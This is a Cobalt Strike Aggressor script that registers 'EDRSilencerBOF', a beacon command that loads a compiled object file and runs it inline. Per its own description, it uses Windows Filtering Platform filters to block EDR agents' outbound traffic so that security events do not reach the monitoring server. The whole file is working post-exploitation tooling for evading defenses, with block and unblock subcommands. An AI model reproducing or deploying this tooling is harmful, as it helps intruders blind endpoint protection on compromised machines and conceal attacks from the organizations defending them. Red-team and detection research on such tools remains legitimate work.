beacon_command_register(
    "EDRSilencerBOF", 
    "A tool uses Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server.", 
    "Synopsis:\n- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n  EDRSilencerBOF blockedr\n\n- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\n  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\n\n- Remove all WFP filters applied by this tool:\n  EDRSilencerBOF unblockall\n\n- Remove a specific WFP filter based on filter id:\n  EDRSilencerBOF unblock <filter id>\n"
);

sub EDRSilencerBOF_Exp {
    local('$bid $flag $filepath $filterid $handle $data $args');
	$bid = $1;
    $flag = $2;
	$filepath = $3;
    $filterid = $4;

    $handle = openf(script_resource("EDRSilencer.". barch($bid).".o"));
    $data = readb($handle, -1);
    closef($handle);

    $args = bof_pack($bid, "zzi", $flag, $filepath, $filterid);
    btask($bid, "Task to run EDRSilencerBOF");
    beacon_inline_execute($bid, $data, "go", $args);
}

alias EDRSilencerBOF {
    if(size(@_) == 2)
    {
        if (("blockedr" eq $2) || ("unblockall" eq $2))
        {
            EDRSilencerBOF_Exp($1, $2, "none", 0);
        }
        else {
            berror($1, beacon_command_detail("EDRSilencerBOF"));
            return;
        }
    }
    else if(size(@_) == 3)
    {
        if (("block" eq $2)  )
        {
            EDRSilencerBOF_Exp($1, $2, $3, 0);
        }
        else if(("unblock" eq $2)){
            EDRSilencerBOF_Exp($1, $2, "none", $3);
        }
        else {
            berror($1, beacon_command_detail("EDRSilencerBOF"));
            return;
        }
    }
    else {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("EDRSilencerBOF"));
        return;
    }


}